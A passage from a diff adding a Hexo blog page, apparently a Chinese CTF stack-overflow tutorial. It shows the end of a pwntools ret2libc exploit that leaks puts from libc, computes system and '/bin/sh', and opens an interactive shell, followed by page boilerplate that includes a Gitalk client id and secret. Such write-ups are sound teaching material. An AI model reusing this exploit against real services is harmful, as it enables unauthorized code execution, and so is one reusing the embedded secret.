class="string">'aaaa'</span></span><br><span class="line">payload += p32(puts_plt)</span><br><span class="line">payload += p32(pwn)</span><br><span class="line">payload += p32(puts_got)</span><br><span class="line">ru(<span class="string">"&gt;"</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">"OK bye~"</span>)</span><br><span class="line">puts_addr = u32(rc(<span class="number">5</span>)[<span class="number">1</span>:])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr---&gt;"</span> + hex(puts_addr)</span><br><span class="line">libc_addr = puts_addr - libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">system = libc_addr + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh = libc_addr + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system---&gt;"</span> + hex(system)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">payload += <span class="string">'aaaa'</span></span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>以上就是针对于libc库泄露真实地址去getshell的题目总结~然而栈溢出的漏洞是有防护的例如（canary），而且保护机制基本是全开的，那么有保护机制又该怎么办呢？预知后事如何——请看栈溢出入门到放弃4</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>V1ct0r</p>
+                    <span>Where there is a will,there is a way！</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">62 <p>Articles</p></a></li>
+                    <li><a href="/categories">7 <p>Categories</p></a></li>
+                    <li><a href="/tags">59 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、初级栈溢出系列"><span class="toc-number">1.</span> <span class="toc-text">一、初级栈溢出系列</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1、ret2text"><span class="toc-number">2.</span> <span class="toc-text">1、ret2text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、ret2shellcode"><span class="toc-number">3.</span> <span class="toc-text">2、ret2shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、ret2syscall"><span class="toc-number">4.</span> <span class="toc-text">3、ret2syscall</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4、ret2libc"><span class="toc-number">5.</span> <span class="toc-text">4、ret2libc</span></a></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            V1ct0r
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+
+    
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+
+    
+<script src="/js/busuanzi.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
